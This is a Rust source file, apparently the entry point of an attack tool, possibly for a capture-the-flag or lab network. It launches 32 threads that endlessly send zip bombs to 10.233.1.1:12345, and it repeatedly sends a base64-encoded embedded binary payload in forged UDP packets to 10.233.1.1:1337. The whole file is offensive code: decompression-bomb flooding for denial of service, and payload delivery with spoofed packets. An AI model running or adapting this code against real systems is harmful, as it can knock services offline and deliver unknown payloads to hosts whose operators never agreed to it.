use std::{thread::sleep, time::Duration};

use tracing::{debug, warn};

mod error;
mod udp_forge;
mod zip_bomb;

fn init_tracing() {
    let subscriber = tracing_subscriber::fmt().with_max_level(tracing::Level::DEBUG);
    tracing::subscriber::set_global_default(subscriber.finish())
        .expect("Failed to set global default");
}

fn main() {
    init_tracing();

    for _ in 0..32 {
        std::thread::spawn(move || {
            let bomb_sender = zip_bomb::ZipBombSender::new("10.233.1.1:12345".parse().unwrap());
            loop {
                match bomb_sender.send_zip_bomb() {
                    Ok(_) => {
                        debug!("Bomb sent!");
                    }
                    Err(e) => {
                        warn!("Error sending bomb: {}", e);
                    }
                }
            }
        });
    }

    let payload = {
        use base64::Engine;
        let payload_raw = include_bytes!("../unhex-payload.bin");
        base64::engine::general_purpose::STANDARD.encode(payload_raw)
    };

    let forger = udp_forge::UdpForger::new(
        "10.233.2.2:31337".parse().unwrap(),
        "10.233.1.1:1337".parse().unwrap(),
    );

    loop {
        forger.send(payload.as_bytes());
        sleep(Duration::from_millis(500));
    }
}
